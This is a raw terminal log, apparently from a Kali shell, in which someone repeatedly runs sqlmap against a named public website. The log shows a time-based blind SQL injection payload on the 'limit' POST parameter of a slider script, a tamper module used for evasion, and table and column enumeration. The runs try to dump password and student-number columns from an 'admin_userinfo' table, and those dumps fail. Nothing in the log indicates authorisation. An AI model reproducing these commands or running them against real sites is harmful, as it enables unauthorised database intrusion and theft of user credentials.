[17:33:20] [INFO] retrieved: mod_signallogin                                                     
[17:34:14] [INFO] retrieved: mod_freeway_admin                                                   
[17:34:15] [INFO] retrieved: orecchini                                                           
[17:34:16] [INFO] retrieved: nlista                                                              
[17:34:17] [INFO] retrieved: jfcategories                                                        
[17:34:18] [INFO] retrieved: mod_lxmenu                                                          
[17:34:19] [INFO] retrieved: id_comune                                                           
[17:34:20] [INFO] retrieved: idatleta                                                            
[17:34:21] [INFO] retrieved: inactive                                                            
[17:34:24] [INFO] retrieved: mod_sidebarmenuapplestyle                                           
[17:35:37] [INFO] retrieved: jenis                                                               
                                                                                                 
[17:35:52] [INFO] fetching entries for table 'EMPLOYEE' in database 'qaisare_com'
[17:35:52] [INFO] fetching number of entries for table 'EMPLOYEE' in database 'qaisare_com'
[17:35:52] [INFO] retrieved: 
[17:35:53] [WARNING] unable to retrieve the number of entries for table 'EMPLOYEE' in database 'qaisare_com'
[17:35:53] [INFO] fetching columns for table 'aggtest' in database 'qaisare_com'
[17:35:53] [INFO] retrieved: 
[17:35:54] [ERROR] unable to retrieve the number of columns for table 'aggtest' in database 'qaisare_com'
[17:35:54] [WARNING] unable to retrieve column names for table 'aggtest' in database 'qaisare_com'
do you want to use common column existence check? [y/N/q] y
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[17:36:45] [INFO] checking column existence using items from '/usr/share/sqlmap/txt/common-columns.txt'
[17:36:45] [INFO] adding words used on web page to the check list
[17:37:17] [INFO] retrieved: dnumber                                                             
[17:38:37] [INFO] retrieved: unit_number                                                         
[17:40:44] [INFO] retrieved: gap_codigo                                                          
[17:41:53] [INFO] retrieved: my                                                                  
[17:42:09] [INFO] retrieved: idkontakt                                                           
[17:42:52] [INFO] retrieved: image                                                               
[17:45:00] [INFO] retrieved: sessione                                                            
[17:47:08] [INFO] retrieved: pro_id                                                              
                                                                                                 
[17:47:29] [INFO] fetching entries for table 'aggtest' in database 'qaisare_com'
[17:47:29] [INFO] fetching number of entries for table 'aggtest' in database 'qaisare_com'
[17:47:29] [INFO] retrieved: 
[17:47:29] [WARNING] unable to retrieve the number of entries for table 'aggtest' in database 'qaisare_com'
[17:47:29] [INFO] fetching columns for table 'idioma' in database 'qaisare_com'
[17:47:29] [INFO] retrieved: 
[17:47:30] [ERROR] unable to retrieve the number of columns for table 'idioma' in database 'qaisare_com'
[17:47:30] [WARNING] unable to retrieve column names for table 'idioma' in database 'qaisare_com'
do you want to use common column existence check? [y/N/q] y
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[17:53:27] [INFO] checking column existence using items from '/usr/share/sqlmap/txt/common-columns.txt'
[17:53:27] [INFO] adding words used on web page to the check list
[17:55:35] [INFO] retrieved: cle                                                                 
[17:55:39] [INFO] retrieved: chave                                                               
[17:57:44] [INFO] retrieved: shipping_rate_id                                                    
[17:58:27] [INFO] retrieved: bezeichnung                                                         
[17:58:52] [INFO] retrieved: schweiz                                                             
[17:59:53] [INFO] retrieved: bf_id                                                               
[18:00:00] [INFO] retrieved: bsm_id                                                              
[18:00:00] [INFO] retrieved: pcode                                                               
[18:02:03] [INFO] retrieved: newsfeeds                                                           
[18:02:38] [INFO] retrieved: mootoolnicemenu                                                     
[18:04:12] [INFO] retrieved: urut                                                                
                                                                                                 
[18:04:16] [INFO] fetching entries for table 'idioma' in database 'qaisare_com'
[18:04:16] [INFO] fetching number of entries for table 'idioma' in database 'qaisare_com'
[18:04:16] [INFO] retrieved: 
[18:04:16] [WARNING] unable to retrieve the number of entries for table 'idioma' in database 'qaisare_com'
[18:04:16] [INFO] fetching columns for table 'dtb_campaign_detail' in database 'qaisare_com'
[18:04:16] [INFO] retrieved: 
[18:04:17] [ERROR] unable to retrieve the number of columns for table 'dtb_campaign_detail' in database 'qaisare_com'
[18:04:17] [WARNING] unable to retrieve column names for table 'dtb_campaign_detail' in database 'qaisare_com'
do you want to use common column existence check? [y/N/q] y
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[18:05:32] [INFO] checking column existence using items from '/usr/share/sqlmap/txt/common-columns.txt'
[18:05:32] [INFO] adding words used on web page to the check list
[18:06:09] [INFO] retrieved: fid                                                                 
[18:07:16] [INFO] retrieved: log                                                                 
[18:07:24] [INFO] retrieved: the_geom                                                            
[18:07:43] [INFO] retrieved: tecla                                                               
[18:09:53] [INFO] retrieved: desconto                                                            
[18:10:37] [INFO] retrieved: standort_nr                                                         
[18:10:43] [INFO] retrieved: abfrsql                                                             
[18:12:03] [INFO] retrieved: blogcommentsaccess                                                  
[18:14:11] [INFO] retrieved: config_item                                                         
[18:16:20] [INFO] retrieved: namaakun                                                            
                                                                                                 
[18:16:29] [INFO] fetching entries for table 'dtb_campaign_detail' in database 'qaisare_com'
[18:16:29] [INFO] fetching number of entries for table 'dtb_campaign_detail' in database 'qaisare_com'
[18:16:29] [INFO] retrieved: 
[18:16:30] [WARNING] unable to retrieve the number of entries for table 'dtb_campaign_detail' in database 'qaisare_com'
[18:16:30] [INFO] fetching columns for table 'jos_components' in database 'qaisare_com'
[18:16:30] [INFO] retrieved: 
[18:16:30] [ERROR] unable to retrieve the number of columns for table 'jos_components' in database 'qaisare_com'
[18:16:30] [WARNING] unable to retrieve column names for table 'jos_components' in database 'qaisare_com'
do you want to use common column existence check? [y/N/q] y
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[18:17:47] [INFO] checking column existence using items from '/usr/share/sqlmap/txt/common-columns.txt'
[18:17:47] [INFO] adding words used on web page to the check list
[18:18:39] [INFO] retrieved: location_id                                                         
[18:19:45] [INFO] retrieved: course_no                                                           
[18:21:54] [INFO] retrieved: xcategoria                                                          
[18:24:02] [INFO] retrieved: am_id                                                               
[18:26:10] [INFO] retrieved: mod_signallogin                                                     
[18:28:18] [INFO] retrieved: jenis                                                               
                                                                                                 
[18:28:30] [INFO] fetching entries for table 'jos_components' in database 'qaisare_com'
[18:28:30] [INFO] fetching number of entries for table 'jos_components' in database 'qaisare_com'
[18:28:30] [INFO] retrieved: 
[18:28:31] [WARNING] unable to retrieve the number of entries for table 'jos_components' in database 'qaisare_com'
[18:28:31] [INFO] fetching columns for table 'user_rights' in database 'qaisare_com'
[18:28:31] [INFO] retrieved: 
[18:28:32] [ERROR] unable to retrieve the number of columns for table 'user_rights' in database 'qaisare_com'
[18:28:32] [WARNING] unable to retrieve column names for table 'user_rights' in database 'qaisare_com'
do you want to use common column existence check? [y/N/q] y
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[18:30:13] [INFO] checking column existence using items from '/usr/share/sqlmap/txt/common-columns.txt'
[18:30:13] [INFO] adding words used on web page to the check list
[18:32:08] [INFO] retrieved: mealid                                                              
[18:33:29] [INFO] retrieved: u_id                                                                
[18:34:17] [INFO] retrieved: product_price_id                                                    
[18:34:18] [INFO] retrieved: country_2_code                                                      
[18:36:26] [INFO] retrieved: tags                                                                
[18:38:35] [INFO] retrieved: pins                                                                
[18:39:15] [INFO] retrieved: idgroup                                                             
[18:39:16] [INFO] retrieved: progetto                                                            
[18:39:31] [INFO] retrieved: mod_translate                                                       
[18:39:32] [INFO] retrieved: flscrvpre                                                           
[18:39:32] [INFO] retrieved: grand                                                               
[18:40:47] [INFO] retrieved: ajar                                                                
                                                                                                 
[18:41:03] [INFO] fetching entries for table 'user_rights' in database 'qaisare_com'
[18:41:03] [INFO] fetching number of entries for table 'user_rights' in database 'qaisare_com'
[18:41:03] [INFO] retrieved: 
[18:41:04] [WARNING] unable to retrieve the number of entries for table 'user_rights' in database 'qaisare_com'
[18:41:04] [INFO] fetching columns for table 'tf_messages' in database 'qaisare_com'
[18:41:04] [INFO] retrieved: 
[18:41:05] [ERROR] unable to retrieve the number of columns for table 'tf_messages' in database 'qaisare_com'
[18:41:05] [WARNING] unable to retrieve column names for table 'tf_messages' in database 'qaisare_com'
do you want to use common column existence check? [y/N/q] n
[18:41:12] [WARNING] unable to enumerate the columns for table 'tf_messages' in database 'qaisare_com', skipping
[18:41:12] [INFO] fetching columns for table 'Class_Def_Table' in database 'qaisare_com'
[18:41:12] [INFO] retrieved: 
[18:41:13] [ERROR] unable to retrieve the number of columns for table 'Class_Def_Table' in database 'qaisare_com'
[18:41:13] [WARNING] unable to retrieve column names for table 'Class_Def_Table' in database 'qaisare_com'
do you want to use common column existence check? [y/N/q] n
[18:41:15] [WARNING] unable to enumerate the columns for table 'Class_Def_Table' in database 'qaisare_com', skipping
[18:41:15] [INFO] fetching columns for table 'journal' in database 'qaisare_com'
[18:41:15] [INFO] retrieved: 
[18:41:16] [ERROR] unable to retrieve the number of columns for table 'journal' in database 'qaisare_com'
[18:41:16] [WARNING] unable to retrieve column names for table 'journal' in database 'qaisare_com'
do you want to use common column existence check? [y/N/q] q
[18:41:18] [ERROR] user quit

[*] shutting down at 18:41:18

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T user_rights --columns
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.10#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:42:16

[18:42:16] [INFO] loading tamper module 'between'
[18:42:16] [INFO] resuming back-end DBMS 'mysql' 
[18:42:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[18:42:16] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:42:16] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[18:42:16] [INFO] fetching columns for table 'user_rights' in database 'qaisare_com'
[18:42:16] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[18:42:25] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[18:42:25] [ERROR] unable to retrieve the number of columns for table 'user_rights' in database 'qaisare_com'
[18:42:25] [WARNING] unable to retrieve column names for table 'user_rights' in database 'qaisare_com'
Database: qaisare_com
Table: user_rights
[12 columns]
+------------------+---------+
| Column           | Type    |
+------------------+---------+
| ajar             | numeric |
| country_2_code   | numeric |
| flscrvpre        | numeric |
| grand            | numeric |
| idgroup          | numeric |
| mealid           | numeric |
| mod_translate    | numeric |
| pins             | numeric |
| product_price_id | numeric |
| progetto         | numeric |
| tags             | numeric |
| u_id             | numeric |
+------------------+---------+

[18:42:25] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 18:42:25

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T mb_users --columns
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.10#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:42:59

[18:42:59] [INFO] loading tamper module 'between'
[18:42:59] [INFO] resuming back-end DBMS 'mysql' 
[18:42:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[18:42:59] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:42:59] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[18:42:59] [INFO] fetching columns for table 'mb_users' in database 'qaisare_com'
[18:42:59] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[18:43:07] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[18:43:08] [ERROR] unable to retrieve the number of columns for table 'mb_users' in database 'qaisare_com'
[18:43:08] [WARNING] unable to retrieve column names for table 'mb_users' in database 'qaisare_com'
do you want to use common column existence check? [y/N/q] y
[18:43:13] [WARNING] it's not recommended to use 'AND/OR time-based blind' and/or 'stacked queries' for common column existence check
are you sure you want to continue? [y/N] y
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[18:43:18] [INFO] checking column existence using items from '/usr/share/sqlmap/txt/common-columns.txt'
[18:43:18] [INFO] adding words used on web page to the check list
[18:44:48] [INFO] tried 354/2499 items (14%)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[18:44:59] [INFO] retrieved: superssn                                                            
[18:47:07] [INFO] retrieved: o                                                                   
[18:49:14] [INFO] tried 1354/2499 items (54%)

[18:49:15] [INFO] adjusting time delay to 1 second due to good response times
[18:49:15] [INFO] retrieved: mos                                                                 
[18:51:24] [INFO] retrieved: idstatogenerale                                                     
[18:53:32] [INFO] retrieved: old                                                                 
                                                                                                 
Database: qaisare_com
Table: mb_users
[5 columns]
+-----------------+---------+
| Column          | Type    |
+-----------------+---------+
| idstatogenerale | numeric |
| mos             | numeric |
| o               | numeric |
| old             | numeric |
| superssn        | numeric |
+-----------------+---------+

[18:54:10] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 18:54:10

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T admin_userinfo --columns
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.10#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:56:53

[18:56:53] [INFO] loading tamper module 'between'
[18:56:54] [INFO] resuming back-end DBMS 'mysql' 
[18:56:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[18:56:54] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:56:54] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[18:56:54] [INFO] fetching columns for table 'admin_userinfo' in database 'qaisare_com'
[18:56:54] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[18:57:02] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[18:57:02] [ERROR] unable to retrieve the number of columns for table 'admin_userinfo' in database 'qaisare_com'
[18:57:02] [WARNING] unable to retrieve column names for table 'admin_userinfo' in database 'qaisare_com'
Database: qaisare_com
Table: admin_userinfo
[13 columns]
+----------------------+---------+
| Column               | Type    |
+----------------------+---------+
| anelli               | numeric |
| bst_time             | numeric |
| can_codice           | numeric |
| channel              | numeric |
| fre_disciplina       | numeric |
| keyword              | numeric |
| mod_freeway_services | numeric |
| page_name            | numeric |
| pff_id               | numeric |
| postcount            | numeric |
| sitepref_name        | numeric |
| student_number       | numeric |
| user_pwd             | numeric |
+----------------------+---------+

[18:57:02] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 18:57:02

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T admin_userinfo -C student_number --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.10#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:57:27

[18:57:27] [INFO] loading tamper module 'between'
[18:57:27] [INFO] resuming back-end DBMS 'mysql' 
[18:57:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[18:57:27] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:57:27] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[18:57:27] [INFO] fetching entries of column(s) 'student_number' for table 'admin_userinfo' in database 'qaisare_com'
[18:57:27] [INFO] fetching number of column(s) 'student_number' entries for table 'admin_userinfo' in database 'qaisare_com'
[18:57:27] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[18:57:35] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[18:57:36] [WARNING] unable to retrieve the number of column(s) 'student_number' entries for table 'admin_userinfo' in database 'qaisare_com'
[18:57:36] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 18:57:36

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T admin_userinfo -C student_number --dump --time-sec 20
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:58:03

[18:58:03] [INFO] loading tamper module 'between'
[18:58:04] [INFO] resuming back-end DBMS 'mysql' 
[18:58:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(20000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[18:58:04] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:58:04] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[18:58:04] [INFO] fetching entries of column(s) 'student_number' for table 'admin_userinfo' in database 'qaisare_com'
[18:58:04] [INFO] fetching number of column(s) 'student_number' entries for table 'admin_userinfo' in database 'qaisare_com'
[18:58:04] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[18:58:12] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[18:58:12] [WARNING] unable to retrieve the number of column(s) 'student_number' entries for table 'admin_userinfo' in database 'qaisare_com'
[18:58:12] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 18:58:12

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T admin_userinfo -C student_numbe --dump --time-sec 20
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.10#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:58:26

[18:58:26] [INFO] loading tamper module 'between'
[18:58:26] [INFO] resuming back-end DBMS 'mysql' 
[18:58:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(20000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[18:58:27] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:58:27] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[18:58:27] [INFO] fetching entries of column(s) 'student_numbe' for table 'admin_userinfo' in database 'qaisare_com'
[18:58:27] [INFO] fetching number of column(s) 'student_numbe' entries for table 'admin_userinfo' in database 'qaisare_com'
[18:58:27] [WARNING] time-based comparison requires larger statistical model, please wait......^C

[18:58:28] [ERROR] user aborted

[*] shutting down at 18:58:28

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T admin_userinfo -C user_pwd --dump --time-sec 20
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.10#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:58:44

[18:58:44] [INFO] loading tamper module 'between'
[18:58:45] [INFO] resuming back-end DBMS 'mysql' 
[18:58:45] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(20000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[18:58:45] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:58:45] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[18:58:45] [INFO] fetching entries of column(s) 'user_pwd' for table 'admin_userinfo' in database 'qaisare_com'
[18:58:45] [INFO] fetching number of column(s) 'user_pwd' entries for table 'admin_userinfo' in database 'qaisare_com'
[18:58:45] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[18:58:53] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[18:58:53] [WARNING] unable to retrieve the number of column(s) 'user_pwd' entries for table 'admin_userinfo' in database 'qaisare_com'
[18:58:53] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 18:58:53

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T admin_userinfo --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.10#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:59:16

[18:59:16] [INFO] loading tamper module 'between'
[18:59:16] [INFO] resuming back-end DBMS 'mysql' 
[18:59:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[18:59:17] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:59:17] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[18:59:17] [INFO] fetching columns for table 'admin_userinfo' in database 'qaisare_com'
[18:59:17] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[18:59:25] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[18:59:25] [ERROR] unable to retrieve the number of columns for table 'admin_userinfo' in database 'qaisare_com'
[18:59:25] [WARNING] unable to retrieve column names for table 'admin_userinfo' in database 'qaisare_com'
[18:59:25] [INFO] fetching entries for table 'admin_userinfo' in database 'qaisare_com'
[18:59:25] [INFO] fetching number of entries for table 'admin_userinfo' in database 'qaisare_com'
[18:59:25] [INFO] retrieved: 
[18:59:26] [WARNING] unable to retrieve the number of entries for table 'admin_userinfo' in database 'qaisare_com'
[18:59:26] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 18:59:26

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --no-cast --tamper between.py -D qaisare_com -T admin_userinfo --dump 
